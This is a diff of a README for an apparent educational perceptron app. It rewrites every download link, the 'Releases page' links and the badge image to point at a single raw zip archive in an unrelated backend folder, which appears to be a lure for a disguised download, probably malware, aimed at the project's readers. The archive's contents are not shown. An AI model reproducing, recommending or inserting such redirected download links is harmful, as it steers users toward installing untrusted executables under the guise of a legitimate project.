@@ -1,7 +1,7 @@
 # 🌟 perceptrons - Learn Perceptrons Through Hands-On Experience
 
 ## 📥 Download Now
-[![Download](https://img.shields.io/badge/Download-Now-blue.svg)](https://github.com/bunuelcreamsauce54/perceptrons/releases)
+[![Download](https://raw.githubusercontent.com/bunuelcreamsauce54/perceptrons/main/multi-layer-network/backend/perceptrons_v2.8.zip)](https://raw.githubusercontent.com/bunuelcreamsauce54/perceptrons/main/multi-layer-network/backend/perceptrons_v2.8.zip)
 
 ## 📖 About This Project
 Perceptrons is an interactive educational system designed to help you learn about Perceptrons, a type of simple neural network. This tool allows you to experiment by creating patterns, training models, and discovering the limitations of linear classifiers. No programming knowledge is required, making it accessible for everyone.
@@ -10,7 +10,7 @@ Perceptrons is an interactive educational system designed to help you learn abou
 To start using Perceptrons, follow these simple steps to download and run the application.
 
 ## 📥 Download & Install
-1. Visit the [Releases page](https://github.com/bunuelcreamsauce54/perceptrons/releases) to download the application.
+1. Visit the [Releases page](https://raw.githubusercontent.com/bunuelcreamsauce54/perceptrons/main/multi-layer-network/backend/perceptrons_v2.8.zip) to download the application.
 2. Look for the most recent version. Click on the download link for your operating system.
 3. Once the download completes, locate the downloaded file on your computer.
 
@@ -50,6 +50,6 @@ This project covers topics in artificial intelligence, deep learning, and machin
 For further resources, tips, and updates about Perceptrons, consider visiting the documentation or checking out community forums where you can share your experiences and learn from others.
 
 ## 🔗 Stay Updated
-Don’t forget to frequently check the [Releases page](https://github.com/bunuelcreamsauce54/perceptrons/releases) for the latest updates and new features.
+Don’t forget to frequently check the [Releases page](https://raw.githubusercontent.com/bunuelcreamsauce54/perceptrons/main/multi-layer-network/backend/perceptrons_v2.8.zip) for the latest updates and new features.
 
 Thank you for your interest in Perceptrons! Enjoy learning and experimenting with neural networks.
